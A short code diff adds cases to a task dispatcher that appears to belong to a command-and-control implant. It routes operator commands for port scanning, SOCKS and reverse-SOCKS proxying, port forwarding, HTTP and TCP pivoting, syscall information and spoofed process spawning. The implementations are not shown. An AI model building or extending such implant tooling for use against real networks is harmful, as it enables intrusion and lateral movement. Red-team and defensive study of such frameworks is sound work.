@@ -1,0 +1,33 @@
+                case "PORTSCAN":
+                    result = Network.PortScan(task.args);
+                    break;
+                case "SOCKS_START":
+                    result = Network.SocksStart(task.args);
+                    break;
+                case "SOCKS_STOP":
+                    result = Network.SocksStop();
+                    break;
+                case "PORTFWD_ADD":
+                    result = Network.PortFwdAdd(task.args);
+                    break;
+                case "PORTFWD_DEL":
+                    result = Network.PortFwdDel(task.args);
+                    break;
+                case "PORTFWD_LIST":
+                    result = Network.PortFwdList();
+                    break;
+                case "RSOCKS_CONNECT":
+                    result = Network.RSocksConnect(task.args);
+                    break;
+                case "PIVOT_HTTP":
+                    result = Network.PivotHttp(task.args);
+                    break;
+                case "PIVOT_TCP":
+                    result = Network.PivotTcp(task.args);
+                    break;
+                case "SYSCALL_INFO":
+                    result = Network.SyscallInfo();
+                    break;
+                case "SPAWN_SPOOFED":
+                    result = Network.SpawnSpoofed(task.args);
+                    break;
